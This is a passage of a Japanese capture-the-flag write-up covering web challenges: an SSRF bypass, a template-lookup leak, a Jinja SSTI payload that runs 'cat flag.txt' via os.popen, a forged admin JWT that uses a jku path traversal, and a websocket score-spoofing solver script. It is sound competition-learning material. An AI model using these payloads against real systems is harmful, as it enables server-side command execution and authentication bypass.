+</code></pre><p><a href="https://book.hacktricks.xyz/v/jp/pentesting-web/ssrf-server-side-request-forgery/url-format-bypass">url-format-bypass</a> を参考に<code class="">http://0.0.0.0</code>をfetchさせることで通った．</p><hr><h2 id="%5Bweb%5D-templater" tabindex="-1">[web] templater</h2><p><img src="/assets/image.060d2d8a.png" alt="alt text"> 入力された文章の中から<code class="">{{key}}</code>という文字列を探しだし，keyに対応するvalueに書き換えてくれるプログラムになっている． <code class="">key</code>が存在しない場合は<code class="">key not found</code>のように出力をしてくれて，<code class="">key:flag</code>は<code class="">value:tjctf{...}</code> を持つ． レスポンスの文章の中に答えのflagが入っていたらflagを隠す仕様になっている．</p><p>flagのフォーマットが<code class="">tjctf{...}</code>であることから，<code class="">{{{{flag}}}</code>のように入力することで，</p><pre class="language-txt" v-pre="true"><code class="language-txt">{{{{flag}}}→{{tjctf{...}}
+</code></pre><p>となる．<code class="">tjctf{...</code>に対応する文字列を出力する必要があるが，<code class="">tjctf{...</code>なるkeyは用意していない．error文に最後の<code class="">}</code>を抜いたflagが出力される． <img src="/assets/image-1.122f5902.png" alt="alt text"></p><hr><h2 id="%5Bweb%5D-music-checkout" tabindex="-1">[web] music-checkout</h2><p><img src="/assets/image-2.5ffa381a.png" alt="alt text"></p><p>色々入力ができるっぽい</p><p><img src="/assets/image-3.a5713a96.png" alt="alt text"></p><p>コードを読むと，textではSSTI対策がされているがusernameではされていないことがわかる．</p><pre class="language-py" v-pre="true"><code class="language-py"><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/create_playlist"</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"POST"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+<span class="token keyword">def</span> <span class="token function">post_playlist</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">try</span><span class="token punctuation">:</span>
+        username <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">"username"</span><span class="token punctuation">]</span>
+        text <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">"text"</span><span class="token punctuation">]</span>
+        <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>text<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token number">10_000</span><span class="token punctuation">:</span>
+            <span class="token keyword">return</span> <span class="token string">"Too much!"</span><span class="token punctuation">,</span> <span class="token number">406</span>
+        <span class="token keyword">if</span> <span class="token string">"{{"</span> <span class="token keyword">in</span> text <span class="token keyword">or</span> <span class="token string">"}}"</span> <span class="token keyword">in</span> text<span class="token punctuation">:</span>
+            <span class="token keyword">return</span> <span class="token string">"Nice try!"</span><span class="token punctuation">,</span> <span class="token number">406</span>
+        text <span class="token operator">=</span> <span class="token punctuation">[</span>line<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">","</span><span class="token punctuation">)</span> <span class="token keyword">for</span> line <span class="token keyword">in</span> text<span class="token punctuation">.</span>splitlines<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span>
+        text <span class="token operator">=</span> <span class="token punctuation">[</span>line<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token punctuation">[</span><span class="token string">"?"</span><span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">4</span> <span class="token operator">-</span> <span class="token builtin">min</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>line<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">for</span> line <span class="token keyword">in</span> text<span class="token punctuation">]</span>
+        filled <span class="token operator">=</span> render_template<span class="token punctuation">(</span><span class="token string">"playlist.html"</span><span class="token punctuation">,</span> username<span class="token operator">=</span>username<span class="token punctuation">,</span> songs<span class="token operator">=</span>text<span class="token punctuation">)</span>
+        this_id <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>uuid<span class="token punctuation">.</span>uuid4<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+        <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"templates/uploads/</span><span class="token interpolation"><span class="token punctuation">{</span>this_id<span class="token punctuation">}</span></span><span class="token string">.html"</span></span><span class="token punctuation">,</span> <span class="token string">"w"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
+            f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>filled<span class="token punctuation">)</span>
+        <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">"created_playlist.html"</span><span class="token punctuation">,</span> uuid_val<span class="token operator">=</span>this_id<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">200</span>
+    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span>
+        <span class="token keyword">return</span> <span class="token string">"Internal server error"</span><span class="token punctuation">,</span> <span class="token number">500</span>
+</code></pre><p><code class="">{{ config.__class__.from_envvar.__globals__.__builtins__.__import__("os").popen("cat flag.txt").read() }}</code>をusernameに入力すればflagが出力される．</p><p><img src="/assets/image-4.f01f71aa.png" alt="alt text"></p><hr><h2 id="%5Bweb%5D-topplecontainer" tabindex="-1">[web] topplecontainer</h2><p>与えられたサイトに行くと，ファイルのアップロードページが与えられる． 認証はjwtで行われている．</p><p><img src="/assets/image-5.f2aabbd4.png" alt="alt text"></p><p>コードを読むと，<code class="">/flag</code>にアクセスした際にjwtのidがadminであるときにflagを返すようになっている． jwtの認証では，ヘッダーのjkuに書かれたjsonファイルから公開鍵を取得し，その鍵でjwtの署名を確認するというようになっている．</p><pre class="language-py" v-pre="true"><code class="language-py"><span class="token keyword">def</span> <span class="token function">login_required</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">def</span> <span class="token function">_login_required</span><span class="token punctuation">(</span>f<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        <span class="token decorator annotation punctuation">@wraps</span><span class="token punctuation">(</span>f<span class="token punctuation">)</span>
+        <span class="token keyword">def</span> <span class="token function">__login_required</span><span class="token punctuation">(</span><span class="token operator">*</span>args<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span><span class="token punctuation">:</span>
+            token <span class="token operator">=</span> request<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"token"</span><span class="token punctuation">)</span>
+            <span class="token keyword">if</span> <span class="token keyword">not</span> token<span class="token punctuation">:</span>
+                <span class="token keyword">return</span> redirect<span class="token punctuation">(</span><span class="token string">"/register"</span><span class="token punctuation">)</span>
+            user <span class="token operator">=</span> verify_token<span class="token punctuation">(</span>token<span class="token punctuation">)</span>
+            <span class="token keyword">if</span> user <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
+                <span class="token keyword">return</span> redirect<span class="token punctuation">(</span><span class="token string">"/register"</span><span class="token punctuation">)</span>
+            <span class="token keyword">return</span> f<span class="token punctuation">(</span><span class="token operator">*</span>args<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">,</span> user<span class="token operator">=</span>user<span class="token punctuation">)</span>
+
+        <span class="token keyword">return</span> __login_required
+
+    <span class="token keyword">return</span> _login_required
+
+<span class="token keyword">def</span> <span class="token function">generate_token</span><span class="token punctuation">(</span>user_id<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">return</span> jwt<span class="token punctuation">.</span>encode<span class="token punctuation">(</span>
+        <span class="token punctuation">{</span><span class="token string">"id"</span><span class="token punctuation">:</span> user_id<span class="token punctuation">}</span><span class="token punctuation">,</span>
+        private_key<span class="token punctuation">,</span>
+        algorithm<span class="token operator">=</span><span class="token string">"ES256"</span><span class="token punctuation">,</span>
+        headers<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">"kid"</span><span class="token punctuation">:</span> KID<span class="token punctuation">,</span> <span class="token string">"jku"</span><span class="token punctuation">:</span> <span class="token string">"jwks.json"</span><span class="token punctuation">}</span><span class="token punctuation">,</span>
+    <span class="token punctuation">)</span>
+
+<span class="token keyword">def</span> <span class="token function">verify_token</span><span class="token punctuation">(</span>token<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">try</span><span class="token punctuation">:</span>
+        header <span class="token operator">=</span> jwt<span class="token punctuation">.</span>get_unverified_header<span class="token punctuation">(</span>token<span class="token punctuation">)</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"header"</span><span class="token punctuation">,</span> header<span class="token punctuation">)</span>
+        jku <span class="token operator">=</span> header<span class="token punctuation">[</span><span class="token string">"jku"</span><span class="token punctuation">]</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"jku"</span><span class="token punctuation">,</span> jku<span class="token punctuation">)</span>
+        <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"static/</span><span class="token interpolation"><span class="token punctuation">{</span>jku<span class="token punctuation">}</span></span><span class="token string">"</span></span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
+            keys <span class="token operator">=</span> json<span class="token punctuation">.</span>load<span class="token punctuation">(</span>f<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">"keys"</span><span class="token punctuation">]</span>
+            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"keys"</span><span class="token punctuation">,</span> keys<span class="token punctuation">)</span>
+        kid <span class="token operator">=</span> header<span class="token punctuation">[</span><span class="token string">"kid"</span><span class="token punctuation">]</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"kid"</span><span class="token punctuation">,</span> kid<span class="token punctuation">)</span>
+        <span class="token keyword">for</span> key <span class="token keyword">in</span> keys<span class="token punctuation">:</span>
+            <span class="token keyword">if</span> key<span class="token punctuation">[</span><span class="token string">"kid"</span><span class="token punctuation">]</span> <span class="token operator">==</span> kid<span class="token punctuation">:</span>
+                public_key <span class="token operator">=</span> jwt<span class="token punctuation">.</span>algorithms<span class="token punctuation">.</span>ECAlgorithm<span class="token punctuation">.</span>from_jwk<span class="token punctuation">(</span>key<span class="token punctuation">)</span>
+                payload <span class="token operator">=</span> jwt<span class="token punctuation">.</span>decode<span class="token punctuation">(</span>token<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> public_key<span class="token punctuation">,</span> algorithms<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"ES256"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+                <span class="token keyword">return</span> payload
+    <span class="token keyword">except</span> Exception<span class="token punctuation">:</span>
+        <span class="token keyword">pass</span>
+    <span class="token keyword">return</span> <span class="token boolean">None</span>
+
+<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/flag"</span><span class="token punctuation">)</span>
+<span class="token decorator annotation punctuation">@login_required</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token keyword">def</span> <span class="token function">get_flag</span><span class="token punctuation">(</span>user<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">if</span> user<span class="token punctuation">[</span><span class="token string">"id"</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"admin"</span><span class="token punctuation">:</span>
+        <span class="token keyword">return</span> flag
+    <span class="token keyword">else</span><span class="token punctuation">:</span>
+        <span class="token keyword">return</span> <span class="token string">"admins only! shoo!"</span>
+</code></pre><p><img src="/assets/image-6.31dffa86.png" alt="alt text"></p><p>以下のような手順で解けそうである</p><ul><li>ファイルのアップロードページにて自分で作成した公開鍵をアップロード</li><li>idをadmin，jkuをアップロード後の公開鍵のパスとしたjwtを作成</li><li><code class="">/flag</code>にアクセス</li></ul><p>まず公開鍵をアップロードして</p><pre class="language-json" v-pre="true"><code class="language-json"><span class="token punctuation">{</span>
+  <span class="token property">"keys"</span><span class="token operator">:</span> <span class="token punctuation">[</span>
+    <span class="token punctuation">{</span>
+      <span class="token property">"kty"</span><span class="token operator">:</span> <span class="token string">"EC"</span><span class="token punctuation">,</span>
+      <span class="token property">"crv"</span><span class="token operator">:</span> <span class="token string">"P-256"</span><span class="token punctuation">,</span>
+      <span class="token property">"x"</span><span class="token operator">:</span> <span class="token string">"0QCXT0NvlTA9Rg6BE9YVnRGQCP9iqnalG-52qL1r_88"</span><span class="token punctuation">,</span>
+      <span class="token property">"y"</span><span class="token operator">:</span> <span class="token string">"5H3jm2p6Cm5lnY7aMa6bVt1YJ7rveUm1ykTfUUAecqI"</span><span class="token punctuation">,</span>
+      <span class="token property">"kid"</span><span class="token operator">:</span> <span class="token string">"1"</span>
+    <span class="token punctuation">}</span>
+  <span class="token punctuation">]</span>
+<span class="token punctuation">}</span>
+</code></pre><p>以下のようにjwtを作成して終わり</p><pre class="language-py" v-pre="true"><code class="language-py"><span class="token keyword">import</span> jwt
+
+<span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'./es256.key.pkcs8'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f_private<span class="token punctuation">:</span>
+    private_key <span class="token operator">=</span> f_private<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
+
+header <span class="token operator">=</span> <span class="token punctuation">{</span>
+    <span class="token string">'alg'</span><span class="token punctuation">:</span> <span class="token string">'ES256'</span><span class="token punctuation">,</span>
+    <span class="token comment"># json 内の kid</span>
+    <span class="token string">'kid'</span><span class="token punctuation">:</span> <span class="token string">'1'</span><span class="token punctuation">,</span>
+    <span class="token comment"># アップロード後のパス</span>
+    <span class="token string">"jku"</span><span class="token punctuation">:</span> <span class="token string">"../uploads/4f43ef06-30ab-4146-8327-9db6a17d2d20/64dfb478-7292-47e6-b27f-307397b82017"</span><span class="token punctuation">,</span>
+    <span class="token string">'typ'</span><span class="token punctuation">:</span> <span class="token string">'JWT'</span>
+<span class="token punctuation">}</span>
+payload <span class="token operator">=</span> <span class="token punctuation">{</span>
+    <span class="token string">"id"</span><span class="token punctuation">:</span> <span class="token string">"admin"</span>
+<span class="token punctuation">}</span>
+
+encoded_jwt <span class="token operator">=</span> jwt<span class="token punctuation">.</span>encode<span class="token punctuation">(</span>payload<span class="token punctuation">,</span> private_key<span class="token punctuation">,</span>
+                         algorithm<span class="token operator">=</span><span class="token string">'ES256'</span><span class="token punctuation">,</span> headers<span class="token operator">=</span>header<span class="token punctuation">)</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"encoded_jwt:"</span><span class="token punctuation">,</span> encoded_jwt<span class="token punctuation">)</span>
+</code></pre><hr><h1 id="%5Bweb%5D-kaboot" tabindex="-1">[web] kaboot</h1><p>クイズにたくさん答える問題．コードは以下．</p><pre class="language-py" v-pre="true"><code class="language-py"><span class="token decorator annotation punctuation">@sock<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/room/&lt;room_id&gt;'</span><span class="token punctuation">)</span>
+<span class="token keyword">def</span> <span class="token function">room_sock</span><span class="token punctuation">(</span>sock<span class="token punctuation">,</span> room_id<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    sock<span class="token punctuation">.</span>send<span class="token punctuation">(</span>b64encode<span class="token punctuation">(</span>kahoot<span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+    scores <span class="token operator">=</span> get_room_scores<span class="token punctuation">(</span>room_id<span class="token punctuation">)</span>
+    <span class="token keyword">for</span> i<span class="token punctuation">,</span> q <span class="token keyword">in</span> <span class="token builtin">enumerate</span><span class="token punctuation">(</span>kahoot<span class="token punctuation">[</span><span class="token string">'questions'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+        sock<span class="token punctuation">.</span>send<span class="token punctuation">(</span>b64encode<span class="token punctuation">(</span>json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span><span class="token punctuation">{</span>
+            <span class="token string">'send_time'</span><span class="token punctuation">:</span> time<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
+            <span class="token string">'scores'</span><span class="token punctuation">:</span> scores<span class="token punctuation">,</span>
+            <span class="token operator">**</span>q<span class="token punctuation">,</span>
+        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+        data <span class="token operator">=</span> sock<span class="token punctuation">.</span>receive<span class="token punctuation">(</span><span class="token punctuation">)</span>
+        data <span class="token operator">=</span> json<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>b64decode<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+        send_time <span class="token operator">=</span> data<span class="token punctuation">[</span><span class="token string">'send_time'</span><span class="token punctuation">]</span>
+        recv_time <span class="token operator">=</span> time<span class="token punctuation">(</span><span class="token punctuation">)</span>
+
+        <span class="token keyword">if</span> <span class="token punctuation">(</span>scores <span class="token operator">:=</span> get_room_scores<span class="token punctuation">(</span>room_id<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">is</span> <span class="token keyword">not</span> <span class="token boolean">None</span> <span class="token keyword">and</span> send_time <span class="token operator">&gt;=</span> time<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+            sock<span class="token punctuation">.</span>send<span class="token punctuation">(</span>b64encode<span class="token punctuation">(</span>json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span><span class="token punctuation">{</span>
+                <span class="token string">'scores'</span><span class="token punctuation">:</span> scores<span class="token punctuation">,</span>
+                <span class="token string">'end'</span><span class="token punctuation">:</span> <span class="token boolean">True</span><span class="token punctuation">,</span>
+                <span class="token string">'message'</span><span class="token punctuation">:</span> <span class="token string">'???'</span>
+            <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+            <span class="token keyword">return</span>
+
+        <span class="token keyword">if</span> i <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>
+            edit_score<span class="token punctuation">(</span>scores<span class="token punctuation">,</span> room_id<span class="token punctuation">,</span> data<span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>
+
+        <span class="token keyword">if</span> data<span class="token punctuation">[</span><span class="token string">'answer'</span><span class="token punctuation">]</span> <span class="token operator">==</span> q<span class="token punctuation">[</span><span class="token string">'answer'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>
+            edit_score<span class="token punctuation">(</span>scores<span class="token punctuation">,</span>
+                       room_id<span class="token punctuation">,</span>
+                       data<span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
+                       get_score<span class="token punctuation">(</span>scores<span class="token punctuation">,</span> room_id<span class="token punctuation">,</span> data<span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1000</span> <span class="token operator">+</span> <span class="token builtin">max</span><span class="token punctuation">(</span><span class="token punctuation">(</span>send_time <span class="token operator">-</span> recv_time<span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">50</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">500</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+    sock<span class="token punctuation">.</span>send<span class="token punctuation">(</span>b64encode<span class="token punctuation">(</span>json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span><span class="token punctuation">{</span>
+        <span class="token string">'scores'</span><span class="token punctuation">:</span> scores<span class="token punctuation">,</span>
+        <span class="token string">'end'</span><span class="token punctuation">:</span> <span class="token boolean">True</span><span class="token punctuation">,</span>
+        <span class="token string">'message'</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f'omg congrats, swiftie!!! </span><span class="token interpolation"><span class="token punctuation">{</span>flag<span class="token punctuation">}</span></span><span class="token string">'</span></span> <span class="token keyword">if</span> get_score<span class="token punctuation">(</span>scores<span class="token punctuation">,</span> room_id<span class="token punctuation">,</span> data<span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&gt;=</span> <span class="token number">1000</span> <span class="token operator">*</span> <span class="token builtin">len</span><span class="token punctuation">(</span>kahoot<span class="token punctuation">[</span><span class="token string">'questions'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token keyword">else</span> <span class="token string">'sucks to suck brooooooooo'</span>
+    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+</code></pre><p>以下の部分を読むと，スコアを問題数 * 1000点以上稼げばいいことがわかる．</p><pre class="language-py" v-pre="true"><code class="language-py">sock<span class="token punctuation">.</span>send<span class="token punctuation">(</span>b64encode<span class="token punctuation">(</span>json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span><span class="token punctuation">{</span>
+        <span class="token string">'scores'</span><span class="token punctuation">:</span> scores<span class="token punctuation">,</span>
+        <span class="token string">'end'</span><span class="token punctuation">:</span> <span class="token boolean">True</span><span class="token punctuation">,</span>
+        <span class="token string">'message'</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f'omg congrats, swiftie!!! </span><span class="token interpolation"><span class="token punctuation">{</span>flag<span class="token punctuation">}</span></span><span class="token string">'</span></span> <span class="token keyword">if</span> get_score<span class="token punctuation">(</span>scores<span class="token punctuation">,</span> room_id<span class="token punctuation">,</span> data<span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&gt;=</span> <span class="token number">1000</span> <span class="token operator">*</span> <span class="token builtin">len</span><span class="token punctuation">(</span>kahoot<span class="token punctuation">[</span><span class="token string">'questions'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token keyword">else</span> <span class="token string">'sucks to suck brooooooooo'</span>
+    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+</code></pre><p>クイズの問題についてはwebsocketでやりとりをしている． 送信するwsの<code class="">send_time</code>を未来の時間に改ざんしようとした場合，<code class="">if (scores := get_room_scores(room_id)) is not None and send_time &gt;= time():</code>に引っかかる．</p><p>同じユーザで複数回問題を解くことで点数を無限に増やす方法を考えたが以下で対策されている． しかし，これは1問目の際にidに書かれたユーザの点数をリセットするという仕組みになっている． 1問目だけユーザ名を偽造すれば点数がリセットされることなく無限に増やせそうである．</p><pre class="language-py" v-pre="true"><code class="language-py"><span class="token keyword">if</span> i <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>
+    edit_score<span class="token punctuation">(</span>scores<span class="token punctuation">,</span> room_id<span class="token punctuation">,</span> data<span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>
+</code></pre><p>↓解答</p><pre class="language-py" v-pre="true"><code class="language-py"><span class="token keyword">from</span> websocket <span class="token keyword">import</span> create_connection
+<span class="token keyword">import</span> requests
+<span class="token keyword">from</span> bs4 <span class="token keyword">import</span> BeautifulSoup
+<span class="token keyword">from</span> base64 <span class="token keyword">import</span> b64decode<span class="token punctuation">,</span> b64encode
+<span class="token keyword">import</span> json
+
+<span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'./kahoot.json'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
+    kahoot <span class="token operator">=</span> json<span class="token punctuation">.</span>load<span class="token punctuation">(</span>f<span class="token punctuation">)</span>
+
+HOST <span class="token operator">=</span> <span class="token string">'kaboot-8415d871f0ea1f31.tjc.tf'</span>
+url <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"https://</span><span class="token interpolation"><span class="token punctuation">{</span>HOST<span class="token punctuation">}</span></span><span class="token string">/create"</span></span>
+uid <span class="token operator">=</span> <span class="token string">'evip'</span>
+
+response <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">)</span>
+h2_element <span class="token operator">=</span> BeautifulSoup<span class="token punctuation">(</span>response<span class="token punctuation">.</span>text<span class="token punctuation">,</span> <span class="token string">"html.parser"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">"h2"</span><span class="token punctuation">)</span>
+room_id <span class="token operator">=</span> h2_element<span class="token punctuation">.</span>text<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">' | '</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'room_id: '</span><span class="token punctuation">,</span> room_id<span class="token punctuation">)</span>
+requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'https://</span><span class="token interpolation"><span class="token punctuation">{</span>HOST<span class="token punctuation">}</span></span><span class="token string">/room/</span><span class="token interpolation"><span class="token punctuation">{</span>room_id<span class="token punctuation">}</span></span><span class="token string">'</span></span><span class="token punctuation">)</span>
+
+ws_url <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f'wss://</span><span class="token interpolation"><span class="token punctuation">{</span>HOST<span class="token punctuation">}</span></span><span class="token string">/room/</span><span class="token interpolation"><span class="token punctuation">{</span>room_id<span class="token punctuation">}</span></span><span class="token string">'</span></span>
+ws <span class="token operator">=</span> create_connection<span class="token punctuation">(</span>ws_url<span class="token punctuation">)</span>
+result <span class="token operator">=</span> ws<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>
+
+<span class="token keyword">for</span> i<span class="token punctuation">,</span> q <span class="token keyword">in</span> <span class="token builtin">enumerate</span><span class="token punctuation">(</span>kahoot<span class="token punctuation">[</span><span class="token string">'questions'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    data <span class="token operator">=</span> ws<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>
+    data <span class="token operator">=</span> json<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>b64decode<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+    res <span class="token operator">=</span> json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span><span class="token punctuation">{</span>
+        <span class="token string">'send_time'</span><span class="token punctuation">:</span> data<span class="token punctuation">[</span><span class="token string">'send_time'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
+        <span class="token string">'answer'</span><span class="token punctuation">:</span> data<span class="token punctuation">[</span><span class="token string">'answer'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
+        <span class="token string">'id'</span><span class="token punctuation">:</span> uid
+    <span class="token punctuation">}</span><span class="token punctuation">)</span>
+    ws<span class="token punctuation">.</span>send<span class="token punctuation">(</span>b64encode<span class="token punctuation">(</span>res<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+result <span class="token operator">=</span> ws<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>
+
+ws_url <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f'wss://</span><span class="token interpolation"><span class="token punctuation">{</span>HOST<span class="token punctuation">}</span></span><span class="token string">/room/</span><span class="token interpolation"><span class="token punctuation">{</span>room_id<span class="token punctuation">}</span></span><span class="token string">'</span></span>
+ws <span class="token operator">=</span> create_connection<span class="token punctuation">(</span>ws_url<span class="token punctuation">)</span>
+result <span class="token operator">=</span> ws<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>
+
+<span class="token keyword">for</span> i<span class="token punctuation">,</span> q <span class="token keyword">in</span> <span class="token builtin">enumerate</span><span class="token punctuation">(</span>kahoot<span class="token punctuation">[</span><span class="token string">'questions'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    data <span class="token operator">=</span> ws<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>
+    data <span class="token operator">=</span> json<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>b64decode<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
